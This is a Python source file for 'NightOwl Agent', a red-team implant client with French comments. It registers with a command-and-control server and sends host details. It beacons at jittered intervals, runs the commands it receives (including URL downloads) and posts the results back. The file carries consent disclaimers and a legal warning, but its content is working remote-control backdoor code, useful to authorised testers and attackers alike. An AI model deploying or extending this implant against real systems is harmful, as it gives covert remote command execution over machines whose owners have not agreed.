#!/usr/bin/env python3
"""
NightOwl Agent - Implant client pour tests Red Team

Agent volontaire déployé avec consentement pour simulations
de post-exploitation en environnement autorisé.
"""

import asyncio
import json
import logging
import platform
import socket
import sys
import os
from typing import Dict, List, Optional
from datetime import datetime, timedelta, timezone
from pathlib import Path

import aiohttp
import psutil
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

from .security import AgentSecurity
from .system_info import SystemInfo
from .command_executor import CommandExecutor


class NightOwlAgent:
    def __init__(self, config: Dict):
        self.config = config
        self.logger = logging.getLogger("nightowl.agent")
        
        # Composants
        self.security = AgentSecurity(config)
        self.system_info = SystemInfo()
        self.executor = CommandExecutor()
        
        # État agent
        self.agent_id: Optional[str] = None
        self.session_id: Optional[str] = None
        self.registered = False
        self.last_beacon: Optional[datetime] = None
        
        # Session HTTP
        self.session: Optional[aiohttp.ClientSession] = None
    
    async def initialize(self):
        """Initialisation de l'agent"""
        try:
            # Création session HTTP
            ssl_context = self.security.create_ssl_context()
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=ssl_context),
                headers={
                    'User-Agent': f'NightOwl-Agent/{self.get_version()}'
                }
            )
            
            # Génération identité
            self.agent_id = self.security.generate_agent_id()
            
            self.logger.info("Agent initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Agent initialization failed: {e}")
            raise
    
    async def register(self) -> bool:
        """Enregistrement auprès du serveur C2"""
        try:
            # Collecte informations système
            system_data = self.system_info.get_all_info()
            
            # Préparation données d'enregistrement (version simplifiée)
            registration_data = {
                "system_info": system_data,
                "platform": platform.platform(),
                "python_version": sys.version,
                "first_seen": datetime.now(timezone.utc).isoformat(),
                "agent_id": self.agent_id,
                "hostname": socket.gethostname()
            }
            
            # Envoi au serveur
            async with self.session.post(
                f"{self.config['server_url']}/api/agent/register",
                json=registration_data,
                timeout=30
            ) as response:
                
                if response.status == 200:
                    result = await response.json()
                    self.agent_id = result['agent_id']
                    self.session_id = result['session_id']
                    self.registered = True
                    
                    self.logger.info(f"Agent registered successfully: {self.agent_id}")
                    return True
                else:
                    self.logger.error(f"Registration failed: {response.status}")
                    return False
                    
        except Exception as e:
            self.logger.error(f"Registration error: {e}")
            return False
    
    async def beacon(self) -> Dict:
        """Envoi d'un beacon au serveur"""
        try:
            # Préparation données beacon
            beacon_data = {
                "agent_id": self.agent_id,
                "session_id": self.session_id,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "system_stats": {
                    "cpu_percent": psutil.cpu_percent(),
                    "memory_percent": psutil.virtual_memory().percent,
                    "disk_usage": psutil.disk_usage('/').percent,
                    "boot_time": psutil.boot_time()
                },
                "process_count": len(psutil.pids())
            }
            
            # Envoi au serveur (sans signature pour les tests)
            async with self.session.post(
                f"{self.config['server_url']}/api/agent/beacon",
                json=beacon_data,
                timeout=30
            ) as response:
                
                if response.status == 200:
                    result = await response.json()
                    self.last_beacon = datetime.now(timezone.utc)
                    
                    self.logger.debug("Beacon sent successfully")
                    return result
                elif response.status == 401:
                    self.logger.warning("Session invalid, re-registering...")
                    if await self.register():
                        self.logger.info("Re-registered successfully")
                    else:
                        self.logger.error("Re-registration failed")
                    return {}
                else:
                    self.logger.warning(f"Beacon failed: {response.status}")
                    return {}
                    
        except Exception as e:
            self.logger.error(f"Beacon error: {e}")
            return {}
    
    async def execute_commands(self, commands: List[Dict]) -> List[Dict]:
        """Exécution des commandes reçues"""
        results = []
        
        for command in commands:
            try:
                # Vérification signature commande
                if not self.security.verify_command_signature(command):
                    self.logger.warning(f"Invalid command signature: {command['id']}")
                    continue
                
                # Exécution commande
                params = command.get('params', {})
                # Injecter server_url pour les commandes qui en ont besoin (ex: download_url)
                if command['command'] == 'download_url' and 'server_url' not in params:
                    params['server_url'] = self.config['server_url']

                result = await self.executor.execute(
                    command['command'], 
                    params
                )
                
                # Ajout résultat
                results.append({
                    "command_id": command['id'],
                    "result": result,
                    "status": "success",
                    "timestamp": datetime.utcnow().isoformat()
                })
                
                self.logger.info(f"Command executed: {command.get('command', 'unknown')}")
                
            except Exception as e:
                self.logger.error(f"Command execution failed: {e}")
                results.append({
                    "command_id": command.get('id', 'unknown'),
                    "result": str(e),
                    "status": "error",
                    "timestamp": datetime.utcnow().isoformat()
                })
        
        return results
    
    async def send_command_results(self, results: List[Dict]) -> bool:
        """Envoi des résultats d'exécution au serveur"""
        try:
            results_data = {
                "agent_id": self.agent_id,
                "session_id": self.session_id,
                "results": results,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            # Envoi des résultats (sans signature pour les tests)
            async with self.session.post(
                f"{self.config['server_url']}/api/agent/command",
                json=results_data,
                timeout=30
            ) as response:
                
                return response.status == 200
                
        except Exception as e:
            self.logger.error(f"Send results failed: {e}")
            return False
    
    async def run(self):
        """Boucle principale de l'agent"""
        try:
            await self.initialize()
            
            # Tentative d'enregistrement
            if not await self.register():
                self.logger.error("Failed to register with C2 server")
                return
            
            # Boucle de beacon
            while True:
                try:
                    # Envoi beacon
                    beacon_response = await self.beacon()
                    
                    if beacon_response and 'commands' in beacon_response:
                        # Exécution commandes
                        results = await self.execute_commands(beacon_response['commands'])
                        
                        # Envoi résultats
                        if results:
                            await self.send_command_results(results)
                    
                    # Calcul prochain beacon avec jitter
                    interval = self.calculate_next_beacon_interval()
                    self.logger.info(f"Next beacon in {interval} seconds")
                    
                    await asyncio.sleep(interval)
                    
                except Exception as e:
                    self.logger.error(f"Beacon loop error: {e}")
                    await asyncio.sleep(60)  # Wait before retry
        
        except KeyboardInterrupt:
            self.logger.info("Agent shutting down...")
        
        finally:
            if self.session:
                await self.session.close()
    
    def calculate_next_beacon_interval(self) -> int:
        """Calcule l'intervalle avant le prochain beacon"""
        import random
        
        client_config = self.config.get('client', {})
        min_interval = client_config.get('beacon_interval_min', 30)
        max_interval = client_config.get('beacon_interval_max', 300)
        jitter = client_config.get('jitter', 0.3)
        
        base_interval = random.randint(min_interval, max_interval)
        jitter_amount = int(base_interval * jitter)
        
        return base_interval + random.randint(-jitter_amount, jitter_amount)
    
    def get_version(self) -> str:
        """Retourne la version de l'agent"""
        return "1.0.0"


def main():
    """Point d'entrée principal de l'agent"""
    import argparse
    import yaml
    
    # Configuration logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('nightowl_agent.log'),
            logging.StreamHandler()
        ]
    )
    
    # Parse arguments
    parser = argparse.ArgumentParser(description='NightOwl Red Team Agent')
    parser.add_argument('--config', '-c', default='config.yaml', help='Configuration file')
    parser.add_argument('--server', '-s', help='C2 Server URL')
    args = parser.parse_args()
    
    # Chargement configuration
    config = {
        'client': {
            'beacon_interval_min': 5,
            'beacon_interval_max': 10,
            'jitter': 0.2
        },
        'security': {
            'encryption_key': "change_this_to_secure_random_key"
        }
    }

    # Determine config path
    config_path = args.config
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        base_path = sys._MEIPASS
        config_path = os.path.join(base_path, 'config.yaml')

    try:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                loaded_config = yaml.safe_load(f)
                if loaded_config:
                    # Merge configurations (simple update)
                    config.update(loaded_config)
                    # Handle nested client config
                    if 'client' in loaded_config and isinstance(loaded_config['client'], dict):
                        config['client'].update(loaded_config['client'])
        else:
            logging.warning(f"Configuration file {config_path} not found. Using defaults.")
    except Exception as e:
        logging.error(f"Error loading configuration: {e}")
        # Continue with defaults
    
    # Override server URL if provided
    if args.server:
        config['server_url'] = args.server
    
    # Vérification URL serveur
    if 'server_url' not in config:
        # Check if it's in client section
        if 'client' in config and 'server_url' in config['client']:
             config['server_url'] = config['client']['server_url']
        else:
            # Fallback default for testing if not specified
            config['server_url'] = "https://127.0.0.1:8443"
            logging.warning(f"Server URL not configured. Using default: {config['server_url']}")
    
    # Affichage avertissement légal
    print("⚠️  NIGHTOWL AGENT - USAGE RESTREINT AUX TESTS AUTORISÉS")
    print("Assurez-vous d'avoir une autorisation écrite avant utilisation!")
    
    # Démarrage agent
    agent = NightOwlAgent(config)
    
    try:
        asyncio.run(agent.run())
    except Exception as e:
        logging.error(f"Agent failed: {e}")
        raise


if __name__ == "__main__":
    main()